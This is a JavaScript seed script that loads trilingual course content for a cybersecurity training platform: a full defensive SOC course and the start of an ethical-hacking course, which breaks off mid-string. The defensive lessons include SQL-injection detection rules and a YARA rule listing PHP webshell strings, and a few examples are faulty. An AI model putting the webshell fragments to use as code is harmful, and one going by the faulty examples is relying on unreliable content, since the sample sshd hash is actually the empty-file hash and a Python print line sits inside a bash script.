require('dotenv').config()
const { PrismaClient } = require('@prisma/client')
const prisma = new PrismaClient()

async function main() {
    console.log('🚀 Début du seed pour les formations en Cybersécurité et Protection des Systèmes...')

    // --- FORMATION 1 : Defensive Security & SOC ---
    const slug1 = 'cybersecurite-protection-systemes-defensive'
    const existing1 = await prisma.course.findUnique({ where: { slug: slug1 } })
    if (existing1) {
        console.log(`ℹ️ Suppression préalable de "${slug1}" pour ré-insertion propre...`)
        await prisma.course.delete({ where: { slug: slug1 } })
    }

    const learningOutcomes1 = [
        "Comprendre le modèle CIA (Confidentialité, Intégrité, Disponibilité) et les cadres réglementaires (ISO 27001, NIS2)",
        "Appliquer le hardening sur les serveurs Linux et Windows (SSH, UFW, Fail2ban, PAM, Auditd)",
        "Maîtriser la cryptographie appliquée, la gestion des certificats PKI (OpenSSL, TLS 1.3) et VPN (WireGuard)",
        "Implémenter une architecture d'identité sécurisée avec IAM, OAuth2/OIDC, MFA et moindres privilèges",
        "Déployer et configurer une plateforme SIEM pour l'analyse centrale de journaux d'événements (Wazuh / ELK)",
        "Créer des règles de détection d'intrusions (IDS/IPS) avec Suricata et Snort et administrer des Pare-feux",
        "Orchestrer la réponse aux incidents informatiques (IR), l'analyse Forensics et le Reverse Engineering basique",
        "Concevoir une architecture réseau d'entreprise selon le modèle Zero Trust et la sécurité des conteneurs Docker/Kubernetes"
    ]

    const learningOutcomes1_en = [
        "Understand the CIA triad and security frameworks (ISO 27001, NIS2)",
        "Apply system hardening on Linux & Windows servers (SSH, UFW, Fail2ban, PAM, Auditd)",
        "Master applied cryptography, PKI management (OpenSSL, TLS 1.3), and VPNs (WireGuard)",
        "Implement secure Identity and Access Management (IAM, OAuth2/OIDC, MFA, Least Privilege)",
        "Deploy and configure a SIEM platform for centralized log analytics (Wazuh / ELK)",
        "Write intrusion detection rules (IDS/IPS) with Suricata & Snort and configure Firewalls",
        "Orchestrate Incident Response (IR), digital forensics, and basic malware analysis",
        "Design enterprise network security using Zero Trust architecture and Docker/Kubernetes container security"
    ]

    const learningOutcomes1_ar = [
        "فهم ثلاثية الأمان (السرية، السلامة، التوافر) والأطر التنظيمية (ISO 27001، NIS2)",
        "تطبيق تحصين الأنظمة (Hardening) على خوادم لينكس ووندوز (SSH، UFW، Fail2ban، Auditd)",
        "إتقان التشفير التطبيقي، إدارة البنية التحتية للمفاتيح العامة PKI وتشفير VPN",
        "تنفيذ نظام إدارة الهوية والوصول (IAM، OAuth2، MFA) وفق مبدأ الحد الأدنى من الصلاحيات",
        "نشر وإعداد منصات SIEM للتحليل المركزي للسجلات والتهديدات (Wazuh / ELK)",
        "إنشاء قواعد كشف الاختراق (IDS/IPS) باستخدام Suricata و Snort وإدارة الجدران النارية",
        "إدارة الاستجابة للحوادث السيبرانية (Incident Response) والتحقيق الجنائي الرقمي (Forensics)",
        "تصميم بنية تحتية آمنة تعتمد نموذج الثقة الصفرية (Zero Trust) وتأمين الحاويات Docker/Kubernetes"
    ]

    const requirements1 = [
        "Connaissances de base de l'administration système Linux (ligne de commande Bash)",
        "Notions fondamentales de réseaux informatiques (IP, TCP/UDP, DNS, Modèle OSI)",
        "Un ordinateur (Windows/macOS/Linux) avec VirtualBox ou Docker pour installer les labos de test",
        "Aucun prérequis avancé en cybersécurité nécessaire - nous partons des fondamentaux !"
    ]

    const requirements1_en = [
        "Basic Linux system administration skills (Bash command line)",
        "Fundamental knowledge of computer networking (IP, TCP/UDP, DNS, OSI Model)",
        "A computer with VirtualBox or Docker to run security test labs",
        "No prior advanced cybersecurity experience required - we start from the basics!"
    ]

    const requirements1_ar = [
        "معرفة أساسية بإدارة أنظمة لينكس (سطر الأوامر Bash)",
        "مبادئ شبكات الكمبيوتر (عناوين IP، بروتوكولات TCP/UDP، DNS، نموذج OSI)",
        "جهاز كمبيوتر مزود بـ VirtualBox أو Docker لتشغيل بيئات الاختبار",
        "لا تشترط خبرة مسبقة متقدمة في الأمن السيبراني - نبدأ من الأساسيات!"
    ]

    const fullDescription1 = `# Cybersécurité & Protection des Systèmes : Defensive Security & SOC

## La formation de référence pour protéger les infrastructures informatiques contre les cyberattaques

Dans un monde interconnecté où les attaques informatiques (Ransomwares, Phishing, Déni de Service DDoS, Exploitation de vulnérabilités Zero-Day) augmentent de manière exponentielle, la **sécurité défensive (Blue Team)** est devenue une compétence stratégique essentielle pour toutes les organisations.

Cette formation pratique vous guide étape par étape pour devenir un **Analyste SOC, Administrateur Sécurité ou Ingénieur Cybersécurité**. Vous apprendrez à sécuriser des serveurs Linux & Windows, concevoir des politiques de sécurité robustes, monitorer des réseaux en temps réel et réagir face aux incidents majeurs.

---

### 💡 Pourquoi suivre cette formation ?

1. **🛡️ Protection Intégrale des Systèmes** : Apprenez à fermer les portes d'entrée de votre infrastructure avant que les attaquants ne les trouvent.
2. **🔍 Détection & SIEM** : Maîtrisez la collecte et l'analyse de logs avec des outils professionnels open-source (Wazuh, ELK Stack).
3. **⚡ Réponse aux Incidents** : Développez les réflexes pour isoler une machine compromise, extraire les preuves numériques et éradiquer la menace.
4. **🏢 Architecture Zero Trust & Cloud** : Modernisez vos réseaux d'entreprise en adoptant les standards industriels actuels.

---

### 📜 Programme des 8 Leçons :
- **Leçon 1** : Fondations de la Cybersécurité, Modèle CIA & Normes (ISO 27001)
- **Leçon 2** : Hardening Linux & Sécurisation Avancée des Serveurs
- **Leçon 3** : Cryptographie Appliquée, PKI & Sécurité des Communications (TLS/VPN)
- **Leçon 4** : Gestion des Identités (IAM), Authentification Forte (MFA/OAuth2) & Active Directory
- **Leçon 5** : Monitoring de Sécurité, Analyse de Logs & Déploiement d'un SIEM (Wazuh)
- **Leçon 6** : Détection d'Intrusions (IDS/IPS Suricata) & Configuration de Pare-feux
- **Leçon 7** : Réponse aux Incidents (IR), Digital Forensics & Analyse de Malware
- **Leçon 8** : Architecture Zero Trust, Sécurité Cloud/Docker & Projet Final SOC
`

    const course1 = await prisma.course.create({
        data: {
            title: "Cybersécurité & Protection des Systèmes : Defensive Security & SOC",
            title_en: "Cybersecurity & Systems Protection: Defensive Security & SOC",
            title_ar: "الأمن السيبراني وحماية الأنظمة: الدفاع السيبراني ومركز العمليات الأمنية SOC",
            slug: slug1,
            description: "Apprenez à sécuriser vos serveurs, détecter les cyberattaques, configurer des SIEM/IDS et orchestrer la réponse aux incidents avec une approche pratique Blue Team.",
            description_en: "Learn to secure servers, detect cyberattacks, configure SIEM/IDS tools, and orchestrate incident response with a hands-on Blue Team approach.",
            description_ar: "تعلم حماية الخوادم، كشف الهجمات السيبرانية، إعداد أدوات SIEM/IDS، وإدارة الاستجابة للحوادث بمنهج عملي للفريق الدفاعي (Blue Team).",
            fullDescription: fullDescription1,
            price: 0,
            isFree: true,
            isPublished: true,
            level: "Intermédiaire",
            duration: "18h 00m",
            image: "/courses/ro_dijkstra_graph.png",
            learningOutcomes: JSON.stringify(learningOutcomes1),
            learningOutcomes_en: JSON.stringify(learningOutcomes1_en),
            learningOutcomes_ar: JSON.stringify(learningOutcomes1_ar),
            requirements: JSON.stringify(requirements1),
            requirements_en: JSON.stringify(requirements1_en),
            requirements_ar: JSON.stringify(requirements1_ar),
            lessons: {
                create: [
                    {
                        order: 1,
                        title: "Leçon 1 : Fondations de la Cybersécurité, Triade CIA & Cadres Règlementaires",
                        title_en: "Lesson 1: Cybersecurity Foundations, CIA Triad & Frameworks",
                        title_ar: "الدرس 1: أساسيات الأمن السيبراني، ثلاثية CIA والأطر التنظيمية",
                        duration: 110,
                        isFree: true,
                        content: `# Leçon 1 : Fondations de la Cybersécurité, Triade CIA & Cadres Règlementaires\n\n## 1. La Triade CIA (Confidentialité, Intégrité, Disponibilité)\n\nTout système d'information sécurisé s'appuie sur trois piliers fondamentaux :\n- **Confidentialité** : S'assurer que les données ne sont accessibles qu'aux utilisateurs autorisés (Tschiffrement AES-256, gestion stricte des clés).\n- **Intégrité** : Garantir que les données et configurations n'ont pas été altérées ou corrompues par un tiers non autorisé (Hashes SHA-256, signatures numériques).\n- **Disponibilité** : Garantir l'accès continu aux services et données pour les utilisateurs légitimes (Haute disponibilité, Load balancing, protection Anti-DDoS, sauvegardes 3-2-1).\n\n---\n\n## 2. Cadres de Référence et Normes Internationales\n\n- **ISO/IEC 27001** : Norme internationale décrivant la mise en place d'un Système de Management de la Sécurité de l'Information (SMSI).\n- **NIST Cybersecurity Framework (CSF)** : Organisé en 5 fonctions clés : *Identify, Protect, Detect, Respond, Recover*.\n- **Directive Européenne NIS2** : Obligations renforcées de cybersécurité pour les infrastructures critiques et opérateurs d'importance vitale.\n\n---\n\n## 3. Modélisation des Menaces & Matrice MITRE ATT&CK\n\nLa matrice **MITRE ATT&CK** est la base de connaissances mondiale répertoriant les tactiques, techniques et procédures (TTPs) employées par les pirates informatiques.\n\n\`\`\`bash\n# Exemple de vérification de l'intégrité d'un fichier binaire avec SHA-256\nsha256sum /usr/bin/sshd\n# Exemple d'output attendu :\n# e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855  /usr/bin/sshd\n\`\`\``
                    },
                    {
                        order: 2,
                        title: "Leçon 2 : Hardening Linux & Sécurisation Avancée des Serveurs",
                        title_en: "Lesson 2: Linux Server Hardening & Security Best Practices",
                        title_ar: "الدرس 2: تحصين خوادم لينكس والمارسات المثلى للأمان",
                        duration: 135,
                        isFree: true,
                        content: `# Leçon 2 : Hardening Linux & Sécurisation Avancée des Serveurs\n\n## 1. Sécurisation du service SSH (/etc/ssh/sshd_config)\n\nLe service SSH est la cible numéro 1 des attaques par force brute. Voici la configuration minimale recommandée pour un serveur Linux de production :\n\n\`\`\`bash\n# Fichier : /etc/ssh/sshd_config.d/security.conf\nPort 2222                           # Changer le port par défaut (optionnel mais utile)\nPermitRootLogin no                  # Interdire l'accès direct en root\nPubkeyAuthentication yes            # Autoriser l'authentification par clé SSH publique\nPasswordAuthentication no           # Désactiver les mots de passe texte brut\nMaxAuthTries 3                      # Limiter les tentatives de connexion\nX11Forwarding no                    # Désactiver le transfert graphique\nAllowTcpForwarding no               # Désactiver le tunnel TCP inutilisé\nClientAliveInterval 300             # Expiration automatique de session inactive (5 min)\nClientAliveCountMax 0\n\`\`\`\n\n---\n\n## 2. Configuration du Firewall UFW & Déploiement de Fail2ban\n\n\`\`\`bash\n# Activation d'UFW (Uncomplicated Firewall)\nsudo ufw default deny incoming\nsudo ufw default allow outgoing\nsudo ufw allow 2222/tcp comment 'SSH Custom Port'\nsudo ufw allow 80/tcp comment 'HTTP'\nsudo ufw allow 443/tcp comment 'HTTPS'\nsudo ufw enable\n\n# Installation et activation de Fail2ban contre les attaques Brute-Force\nsudo apt update && sudo apt install fail2ban -y\n\n# Configuration de la jail SSH (/etc/fail2ban/jail.local)\nsudo bash -c 'cat <<EOF > /etc/fail2ban/jail.local\n[sshd]\nenabled = true\nport = 2222\nlogpath = %(sshd_log)s\nbackend = %(sshd_backend)s\nmaxretry = 3\nfindtime = 10m\nbantime = 24h\nEOF'\n\nsudo systemctl restart fail2ban\nsudo fail2ban-client status sshd\n\`\`\`\n\n---\n\n## 3. Restriction des Droits & Module PAM / Auditd\n\nLe daemon \`auditd\` surveille en temps réel toute modification suspecte dans les fichiers sensibles (/etc/passwd, /etc/shadow, /etc/sudoers).\n\n\`\`\`bash\n# Surveillance de la modification des comptes utilisateurs\nsudo auditctl -w /etc/passwd -p wa -k audit_passwd\nsudo auditctl -w /etc/shadow -p wa -k audit_shadow\n\`\`\``
                    },
                    {
                        order: 3,
                        title: "Leçon 3 : Cryptographie Appliquée, PKI & Sécurité des Communications",
                        title_en: "Lesson 3: Applied Cryptography, PKI Infrastructure & VPNs",
                        title_ar: "الدرس 3: التشفير التطبيقي، البنية التحتية للمفاتيح العامة PKI شبكات VPN",
                        duration: 140,
                        isFree: false,
                        content: `# Leçon 3 : Cryptographie Appliquée, PKI & Sécurité des Communications\n\n## 1. Chiffrement Symétrique vs Asymétrique\n\n- **Chiffrement Symétrique (AES-GCM / ChaCha20)** : Une seule clé partagée sert à chiffrer et déchiffrer. Idéal pour le transfert rapide de gros volumes de données.\n- **Chiffrement Asymétrique (RSA-4096 / ECC Ed25519)** : Une paire de clés (Clé Publique pour chiffrer / Clé Privée pour déchiffrer). Utilisé pour l'échange de clés et les signatures numériques.\n\n---\n\n## 2. Génération d'une Autorité de Certification (CA) avec OpenSSL\n\n\`\`\`bash\n# 1. Génération de la clé privée de l'Autorité de Certification (Root CA)\nopenssl genrsa -out rootCA.key 4096\n\n# 2. Création du certificat racine auto-signé (Valide 10 ans)\nopenssl req -x509 -new -nodes -key rootCA.key -sha256 -days 3650 -out rootCA.crt \\\n  -subj "/C=DZ/ST=Alger/L=Alger/O=ElSayf Security/CN=ElSayf Root CA"\n\n# 3. Génération d'une clé privée de serveur web\nopenssl genrsa -out server.key 2048\n\n# 4. Création de la demande de signature de certificat (CSR)\nopenssl req -new -key server.key -out server.csr \\\n  -subj "/C=DZ/ST=Alger/L=Alger/O=ElSayf Enterprise/CN=secure.elsayf.click"\n\n# 5. Signature du certificat serveur par la Root CA\nopenssl x509 -req -in server.csr -CA rootCA.crt -CAkey rootCA.key -CAcreateserial \\\n  -out server.crt -days 825 -sha256\n  \nprint("✅ Certificat SSL/TLS professionnel généré avec succès !")\n\`\`\`\n\n---\n\n## 3. Tunneling Sécurisé WireGuard VPN\n\nWireGuard offre des performances supérieures à OpenVPN grâce à l'utilisation d'algorithmes modernes (Curve25519, ChaCha20-Poly1305).\n\n\`\`\`ini\n# Configuration Serveur /etc/wireguard/wg0.conf\n[Interface]\nPrivateKey = SERVEUR_PRIVATE_KEY\nAddress = 10.0.0.1/24\nListenPort = 51820\n\n[Peer]\nPublicKey = CLIENT_PUBLIC_KEY\nAllowedIPs = 10.0.0.2/32\n\`\`\``
                    },
                    {
                        order: 4,
                        title: "Leçon 4 : Gestion des Identités (IAM), Authentification Forte & Active Directory",
                        title_en: "Lesson 4: IAM, Multi-Factor Authentication & Active Directory Security",
                        title_ar: "الدرس 4: إدارة الهويات IAM، المصادقة المتعددة العوامل وأمان Active Directory",
                        duration: 130,
                        isFree: false,
                        content: `# Leçon 4 : Gestion des Identités (IAM), Authentification Forte & Active Directory\n\n## 1. Principes de la Gestion des Identités & Accès (IAM)\n\nL'IAM s'articule autour des principes fondamentaux suivants :\n- **RBAC (Role-Based Access Control)** : Les permissions sont attribuées selon le rôle professionnel (ex: Admin, Auditor, Developer).\n- **ABAC (Attribute-Based Access Control)** : Contrôle dynamique basé sur la localisation, l'heure et l'état du périphérique.\n- **Moindre Privilège (Least Privilege)** : Aucun utilisateur ni processus ne possède de droits supérieurs à ce qui est strictement nécessaire.\n\n---\n\n## 2. Double Facteur d'Authentification (MFA / TOTP en Python)\n\nExemple de vérification d'un code TOTP (Google Authenticator / Authy) avec Python :\n\n\`\`\`python\nimport pyotp\nimport time\n\n# Génération d'une clé secrète pour un utilisateur\nsecret = pyotp.random_base32()\nprint("Clé Secrète TOTP à stocker en DB :", secret)\n\n# Génération de l'URL pour le QR Code\ntotp_uri = pyotp.totp.TOTP(secret).provisioning_uri(\n    name="user@elsayf.click",\n    issuer_name="ElSayf Platform Security"\n)\nprint("Lien QR Code :", totp_uri)\n\n# Vérification du code saisi par l'utilisateur\ntotp = pyotp.TOTP(secret)\ncode_saisi = totp.now() # Simulation du code dynamique à 6 chiffres\n\nis_valid = totp.verify(code_saisi)\nprint(f"Code {code_saisi} valide ? {is_valid}")\n\`\`\`\n\n---\n\n## 3. Sécurisation Active Directory / LDAP\n\nProtections essentielles contre les attaques courantes (Kerberoasting, Pass-the-Hash, AS-REP Roasting) :\n- Désactivation du protocole NTLMv1 au profit de Kerberos.\n- Implémentation du LAPS (Local Administrator Password Solution).\n- Utilisation de comptes de services gérés (gMSA).`
                    },
                    {
                        order: 5,
                        title: "Leçon 5 : Monitoring de Sécurité, Analyse de Logs & Déploiement d'un SIEM (Wazuh)",
                        title_en: "Lesson 5: Security Monitoring, Log Analytics & SIEM Deployment",
                        title_ar: "الدرس 5: المراقبة الأمنية، تحليل السجلات ونشر نظام SIEM (Wazuh)",
                        duration: 150,
                        isFree: false,
                        content: `# Leçon 5 : Monitoring de Sécurité, Analyse de Logs & Déploiement d'un SIEM (Wazuh)\n\n## 1. Qu'est-ce qu'un SIEM (Security Information and Event Management) ?\n\nUn SIEM est le cœur du **SOC (Security Operations Center)**. Il centralise, normalise, corrèle et analyse des millions d'événements par jour provenant des serveurs, pare-feux, bases de données et postes de travail.\n\n--- \n\n## 2. Déploiement Rapide du SIEM Wazuh avec Docker Compose\n\n\`\`\`yaml\n# docker-compose.yml - Stack Wazuh SIEM\nversion: '3.8'\n\nservices:\n  wazuh.manager:\n    image: wazuh/wazuh-manager:4.7.0\n    restart: always\n    ports:\n      - "1514:1514/udp"  # Agent communication\n      - "1515:1515/tcp"  # Agent registration\n      - "55000:55000/tcp" # REST API\n    volumes:\n      - wazuh_etc:/var/ossec/etc\n      - wazuh_logs:/var/ossec/logs\n\n  wazuh.indexer:\n    image: wazuh/wazuh-indexer:4.7.0\n    environment:\n      - "OPENSEARCH_JAVA_OPTS=-Xms1g -Xmx1g"\n\n  wazuh.dashboard:\n    image: wazuh/wazuh-dashboard:4.7.0\n    ports:\n      - "443:5601"\n    environment:\n      - WAZUH_MANAGER_URL=https://wazuh.manager\n\nvolumes:\n  wazuh_etc:\n  wazuh_logs:\n\`\`\`\n\n---\n\n## 3. Écriture de Règles de Détection Personnalisées dans Wazuh\n\nExemple de règle XML pour détecter une tentative d'élévation de privilège via \`sudo\` :\n\n\`\`\`xml\n<!-- /var/ossec/etc/rules/local_rules.xml -->\n<group name="local,syslog,sudo,">\n  <rule id="100001" level="10">\n    <if_sid>5402</if_sid>\n    <match>COMMAND=/bin/bash</match>\n    <description>ALERTE SOC : Ouverture d'un shell root interactif via sudo par un utilisateur non-admin !</description>\n    <mitre>\n      <id>T1078</id>\n    </mitre>\n  </rule>\n</group>\n\`\`\``
                    },
                    {
                        order: 6,
                        title: "Leçon 6 : Détection d'Intrusions (IDS/IPS Suricata) & Configuration de Pare-feux",
                        title_en: "Lesson 6: Intrusion Detection Systems (IDS/IPS Suricata) & Advanced Firewalls",
                        title_ar: "الدرس 6: أنظمة كشف الاختراق (IDS/IPS Suricata) والجدران النارية المتقدمة",
                        duration: 135,
                        isFree: false,
                        content: `# Leçon 6 : Détection d'Intrusions (IDS/IPS Suricata) & Configuration de Pare-feux\n\n## 1. Fonctionnement d'un IDS/IPS (Suricata / Snort)\n\nUn **IDS (Intrusion Detection System)** inspecte le trafic réseau en mode passif et génère une alerte lors de la correspondance avec une signature d'attaque.\nUn **IPS (Intrusion Prevention System)** est placé en ligne (*inline*) et bloque immédiatement les paquets malveillants.\n\n---\n\n## 2. Écriture de Règles Suricata Personnalisées\n\n\`\`\`bash\n# Exemple 1 : Détection d'une tentative de scan Nmap SYN\nalert tcp $EXTERNAL_NET any -> $HOME_NET any (\n    msg:"DEFENSE SOC - Tentative de Scan Nmap Détectée"; \n    flags:S; \n    threshold: type threshold, track by_src, count 20, seconds 5; \n    sid:1000001; \n    rev:1;\n)\n\n# Exemple 2 : Détection d'une requête HTTP contenant un payload SQL Injection\nalert http $EXTERNAL_NET any -> $HTTP_SERVERS any (\n    msg:"DEFENSE SOC - Tentative d'injection SQL dans l'URL"; \n    flow:established,to_server; \n    http.uri; content:"UNION"; nocase; content:"SELECT"; nocase; \n    sid:1000002; \n    rev:1;\n)\n\`\`\`\n\n---\n\n## 3. Configuration Avancée du Pare-feu Linux avec IPTables & NFTables\n\n\`\`\`bash\n# Script de sécurité réseau NFTables (/etc/nftables.conf)\n#!/usr/sbin/nft -f\n\nflush ruleset\n\ntable inet filter {\n    chain input {\n        type filter hook input priority 0; policy drop;\n        \n        # Autoriser le trafic sur la boucle locale (loopback)\n        iifname "lo" accept\n        \n        # Autoriser les connexions établies et liées\n        ct state established,related accept\n        \n        # Anti-DDoS SYN Flood\n        tcp flags syn limit rate 10/second burst 20 packets accept\n        \n        # Autoriser SSH sur port personnalisé et HTTP/HTTPS\n        tcp dport 2222 accept\n        tcp dport { 80, 443 } accept\n    }\n}\n\`\`\``
                    },
                    {
                        order: 7,
                        title: "Leçon 7 : Réponse aux Incidents (IR), Digital Forensics & Analyse de Malware",
                        title_en: "Lesson 7: Incident Response (IR), Digital Forensics & Malware Analysis",
                        title_ar: "الدرس 7: الاستجابة للحوادث السيبرانية IR والتحقيق الجنائي الرقمي Forensics",
                        duration: 145,
                        isFree: false,
                        content: `# Leçon 7 : Réponse aux Incidents (IR), Digital Forensics & Analyse de Malware\n\n## 1. Le Cycle de Réponse aux Incidents (NIST SP 800-61)\n\n1. **Préparation** : Outils de collecte de preuves prêts, équipe formée.\n2. **Détection & Analyse** : Identification de l'anomalie et mesure du périmètre d'impact.\n3. **Confinement** : Isolement réseau du serveur compromis pour empêcher la propagation (*Lateral Movement*).\n4. **Éradication & Restauration** : Suppression des portes dérobées (*Backdoors*), nettoyage et remise en production.\n5. **Post-Incident (Lessons Learned)** : Rapport d'incident et amélioration des règles de sécurité.\n\n---\n\n## 2. Collecte de Preuves RAM & Disque avec Volatility 3\n\n\`\`\`bash\n# 1. Extraction des processus en cours d'exécution dans un dump mémoire RAM\npython3 vol.py -f memory_dump.raw windows.pslist\n\n# 2. Détection de processus cachés ou injectés (Malware)\npython3 vol.py -f memory_dump.raw windows.malfind\n\n# 3. Extraction des connexions réseau actives lors du crash\npython3 vol.py -f memory_dump.raw windows.netscan\n\`\`\`\n\n---\n\n## 3. Analyse de Signature avec YARA Rules\n\nCréation d'une règle YARA pour détecter un cheval de Troie (*Trojan*) dans les fichiers du serveur :\n\n\`\`\`yara\nrule Detect_Suspicious_Backdoor {\n    meta:\n        author = "ElSayf Security Analyst"\n        description = "Détecte un webshell PHP malveillant"\n        date = "2026-07-26"\n    strings:\n        $cmd1 = "eval(base64_decode"\n        $cmd2 = "system($_GET['cmd'])"\n        $cmd3 = "passthru("\n    condition:\n        any of ($cmd*)\n}\n\`\`\``
                    },
                    {
                        order: 8,
                        title: "Leçon 8 : Architecture Zero Trust, Sécurité Cloud/Docker & Projet Final SOC",
                        title_en: "Lesson 8: Zero Trust Architecture, Cloud & Container Security (Projet Final)",
                        title_ar: "الدرس 8: بنية الثقة الصفرية Zero Trust وأمان السحابة والحاويات (مشروع نهائي)",
                        duration: 150,
                        isFree: false,
                        content: `# Leçon 8 : Architecture Zero Trust, Sécurité Cloud/Docker & Projet Final SOC\n\n## 1. Principes du Modèle Zero Trust ("Never Trust, Always Verify")\n\nDans le modèle traditionnel de sécurité en périmètre (Château d'eau), tout ce qui est à l'intérieur du réseau d'entreprise est considéré comme sûr. \nDans le modèle **Zero Trust** :\n- Aucun utilisateur, machine ou service n'est fait confiance par défaut, qu'il soit interne ou externe.\n- Authentification et autorisation systématiques pour chaque requête.\n- Micro-segmentation stricte des réseaux.\n\n---\n\n## 2. Hardening des Conteneurs Docker sous Linux\n\n\`\`\`dockerfile\n# Dockerfile Sécurisé (Best Practices)\nFROM node:20-alpine\n\n# 1. Créer un utilisateur non-root restreint\nRUN addgroup -S appgroup && adduser -S appuser -G appgroup\n\nWORKDIR /app\nCOPY package*.json ./\nRUN npm ci --only=production\n\nCOPY . .\nRUN chown -R appuser:appgroup /app\n\n# 2. Exécuter en tant qu'utilisateur non-privilégié\nUSER appuser\n\nEXPOSE 3000\nCMD ["node", "server.js"]\n\`\`\`\n\n---\n\n## 🏆 Projet Final : Architecture Complexe de Sécurité Défensive SOC\n\nVous êtes l'administrateur sécurité d'une entreprise fintech. Vous devez :\n1. Sécuriser le serveur web contre les attaques brutes via UFW et Fail2ban.\n2. Installer et connecter un agent Wazuh au SIEM central.\n3. Écrire une règle Suricata pour bloquer les tentatives de scans non autorisés.\n4. Rédiger un rapport de post-incident complet à présenter à la direction.`
                    }
                ]
            }
        }
    })

    console.log(`✅ Formation 1 créée avec succès ! ID: ${course1.id} | Slug: ${course1.slug}`)


    // --- FORMATION 2 : Ethical Hacking & Pentest Web ---
    const slug2 = 'ethical-hacking-securite-web-pentest'
    const existing2 = await prisma.course.findUnique({ where: { slug: slug2 } })
    if (existing2) {
        console.log(`ℹ️ Suppression préalable de "${slug2}" pour ré-insertion propre...`)
        await prisma.course.delete({ where: { slug: slug2 } })
    }

    const learningOutcomes2 = [
        "Comprendre les méthodologies d'audit de sécurité éthique et le cadre légal du Pentesting (PTES, OWASP)",
        "Réaliser des phases de reconnaissance passive et active (OSINT, Nmap, Sublist3r, Wireshark)",
        "Identifier, exploiter et corriger les vulnérabilités majeures de l'OWASP Top 10 (SQLi, XSS, CSRF, SSRF)",
        "Exploiter les failles de contrôle d'accès (IDOR, Broken Access Control) et l'exécution de code à distance (RCE)",
        "Auditer la sécurité des API REST, tokens JWT et réaliser des fuzzer automatiques avec Python & Burp Suite",
        "Maîtriser l'élévation de privilèges (Privilege Escalation) sur les environnements Linux et Windows",
        "Concevoir des scripts d'exploitation d'attaques sécurisés sous Python pour automatiser les tests de pénétration",
        "Rédiger un rapport d'audit de sécurité professionnel structuré avec recommandations de correctifs pour les développeurs"
    ]

    const learningOutcomes2_en = [
        "Understand ethical hacking methodologies and the legal framework of Pentesting (PTES, OWASP)",
        "Perform passive and active reconnaissance (OSINT, Nmap, Sublist3r, Wireshark)",
        "Identify, exploit, and remediate OWASP Top 10 vulnerabilities (SQLi, XSS, CSRF, SSRF)",
        "Exploit Access Control flaws (IDOR, Broken Access Control) and Remote Code Execution (RCE)",
        "Audit REST API security, JWT tokens, and build automated fuzzers with Python & Burp Suite",
        "Master local Privilege Escalation techniques on Linux and Windows environments",
        "Develop custom Python exploit automation scripts for penetration testing",
        "Write a professional penetration testing report complete with developer remediation guidelines"
    ]

    const learningOutcomes2_ar = [
        "فهم منهجيات الاختبار الأخلاقي والإطار القانوني لاختبار الاختراق (PTES، OWASP)",
        "إجراء مراحل الاستطلاع النشط والخامل (OSINT، Nmap، Sublist3r، Wireshark)",
        "اكتشاف، استغلال وترقيع ثغرات OWASP Top 10 الرئيسية (SQLi، XSS، CSRF، SSRF)",
        "استغلال الثغرات المتعلقة بالتحكم بالوصول (IDOR) والتنفيذ البعيد للأوامر (RCE)",
        "مراجعة أمان واجهات برمجة التطبيقات (APIs)، رمور JWT، وبناء أدوات الفحص التلقائي بواسطة بايثون و Burp Suite",
        "إتقان تقنيات رفع الصلاحيات (Privilege Escalation) على أنظمة لينكس ووندوز",
        "تطوير أدوات وسكريبتات استغلال مخصصة بلغة بايثون لأتمتة عمليات الاختراق",
        "كتابة تقرير اختبار اختراق احترافي موجه للمطورين والإدارة مع التوصيات البرمجية اللازمة"
    ]

    const requirements2 = [
        "Bases solides du fonctionnement du web (HTTP/HTTPS, HTML, JavaScript, requêtes GET/POST)",
        "Notions de base en programmation Python (variables, boucles, requêtes HTTP avec requests)",
        "Système d'exploitation Kali Linux ou Parrot OS (installé en Machine Virtuelle VirtualBox/VMware)",
        "Esprit d'analyse, curiosité et respect strict de la déontologie du Pentesting éthique !"
    ]

    const requirements2_en = [
        "Solid understanding of web technologies (HTTP/HTTPS, HTML, JavaScript, GET/POST requests)",
        "Basic Python programming knowledge (variables, loops, requests library)",
        "Kali Linux or Parrot OS operating system (installed in a VirtualBox/VMware VM)",
        "Analytical mindset, curiosity, and strict compliance with ethical hacking guidelines!"
    ]

    const requirements2_ar = [
        "فهم جيد لتقنيات الويب (HTTP/HTTPS، HTML، JavaScript، طلبات GET/POST)",
        "معرفة أساسية ببرمجة بايثون (المتغيرات، الحلقات، مكتبة requests)",
        "نظام تشغيل Kali Linux أو Parrot OS (مثبت كجهاز وهمي VirtualBox/VMware)",
        "عقلية تحليلية، شغف بالتعلم، والالتزام التام بأخلاقيات اختبار الاختراق!"
    ]

    const fullDescription2 = `# Ethical Hacking & Pentest : Sécurité des Applications Web & OWASP Top 10

## Apprenez à penser comme un attaquant pour mieux défendre vos applications et infrastructures

L'**Ethical Hacking (Pentesting)** consiste à auditer de manière autorisée des systèmes et applications pour y découvrir les failles de sécurité avant que des pirates malveillants (*Black Hats*) ne les exploitent à des fins de vol de données ou d'extorsion.

Cette formation 100% pratique et orientée **Red Team / Web Security** vous prend par la main depuis la phase d'information et de reconnaissance jusqu'à l'exploitation des failles critiques du **OWASP Top 10**, le fuzzing d'APIs REST, l'élévation de privilèges et la rédaction d'un rapport de synthèse professionnel.

---

### 💡 Pourquoi suivre cette formation ?

1. **🎯 Compétence Trés Recherchée** : Le recrutement de Pentesters et Consultants en Sécurité Web connaît une croissance exponentielle.
2. **🧪 Ateliers Pratiques Réels** : Pratiquez sur des environnements de laboratoire sécurisés (DVWA, OWASP Juice Shop, machines virtuelles HackTheBox/TryHackMe).
3. **🐍 Automation & Python Security** : Développez vos propres scripts d'exploitation et de fuzzing sur-mesure.
4. **📄 Méthodologie Professionnelle** : Apprenez à rédiger un rapport d'audit avec recommandations exploitables par les développeurs.

---

### 📜 Programme des 8 Leçons :
- **Leçon 1** : Fondations du Pentesting Éthique & Méthodologie PTES
- **Leçon 2** : Reconnaissance, Cartographie & Scanner de Réseau (Nmap, OSINT)
- **Leçon 3** : OWASP Top 10 (Partie 1) - SQL Injections (SQLi) & Bypass d'Auth
- **Leçon 4** : OWASP Top 10 (Partie 2) - Cross-Site Scripting (XSS), CSRF & SSRF
- **Leçon 5** : OWASP Top 10 (Partie 3) - Command Injection (RCE), IDOR & Broken Access Control
- **Leçon 6** : Auditing d'APIs REST, Sécurité JWT & Fuzzing avec Burp Suite & Python
- **Leçon 7** : Élévation de Privilèges (PrivEsc Linux/Windows) & Scripting d'Exploits
